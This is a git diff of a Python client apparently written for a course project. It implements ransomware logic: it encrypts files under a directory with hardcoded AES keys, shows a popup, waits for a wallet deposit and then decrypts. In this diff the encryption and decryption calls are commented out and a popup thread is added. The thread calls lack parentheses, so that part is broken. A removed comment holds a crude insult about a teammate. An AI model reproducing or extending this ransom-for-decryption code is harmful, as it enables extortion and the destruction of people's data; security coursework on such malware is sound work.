@@ -1,9 +1,9 @@
-# client.py
-# import socket
 from base64 import encode
 import os
+import threading
 from util.AES import aes
 from util.checkWallet import CheckWallet
+from util.popup import PopUp
 
 
 a = aes(b'6969696969696969', b'4242424242424242')
@@ -23,34 +23,16 @@ def decodeFiles(path):
                 currentFile = os.path.join(root, file)
                 a.decrypt(currentFile)
 
-
-
 path = "../../testing/cosc469-testing-data"
-encodeFiles(path)
-
-# CALL LOGAN'S bitch ass modal
+# encodeFiles(path)
+pu = PopUp()
 print("Files have been encrypted!")
-
 cw = CheckWallet()
+t = threading.Thread(target=pu.mainloop)
+t.start
 if cw.waitForDeposit():
-    decodeFiles(path)
+    pass
+    # decodeFiles(path)
 print("Files have been decrypted!")
+t.join
 
-
-# create a socket object
-# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-# get local machine name
-# host = socket.gethostname()
-
-# port = 9999
-
-# connection to hostname on the port.
-# s.connect((host, port))
-
-# Receive no more than 1024 bytes
-# tm = s.recv(1024)
-# print(tm.decode('ascii'))
-
-
-# s.close()
